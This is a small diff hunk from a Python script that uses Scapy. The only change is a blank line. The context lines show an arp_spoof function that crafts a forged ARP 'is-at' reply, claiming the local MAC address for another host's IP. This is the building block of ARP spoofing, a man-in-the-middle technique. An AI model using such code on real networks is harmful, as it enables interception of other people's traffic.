@@ -4,6 +4,7 @@ import sys
 
 my_mac = Ether().src.strip('\'').rstrip('\'')
 
+
 def arp_spoof(dest_ip, dest_mac, source_ip):
     packet = ARP(op='is-at', hwsrc=my_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
     print(packet.show())
